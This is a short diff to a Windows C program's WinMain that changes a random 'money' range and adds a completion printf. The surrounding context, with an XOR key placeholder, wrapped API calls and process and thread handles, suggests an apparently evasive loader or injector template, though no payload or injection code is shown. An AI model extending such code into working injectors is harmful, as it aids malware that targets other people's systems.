@@ -9,8 +9,8 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     srand(time(NULL));
     uint16_t key = %XOR_KEY%; // Placeholder for XOR key
     char path[MAX_PATH]; 
-    int min = 3000; // Minimum range for random money
-    int max = 15000; // Maximum range for random money
+    int min = 4000; // Minimum range for random money
+    int max = 17000; // Maximum range for random money
     int range = max - min + 1;
     int money =  min + (int)(rand() / (double)RAND_MAX * range) + RANDOM_VAL; // Calculate random money
     int money_spent = 0; // Initialize money spent tracker
@@ -106,6 +106,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
         // Close handles to clean up
         _CloseHandle(th);
         _CloseHandle(hProcess);
+        printf("we're done\n"); // Indicate completion
     }
 
     return 0; // Exit the program
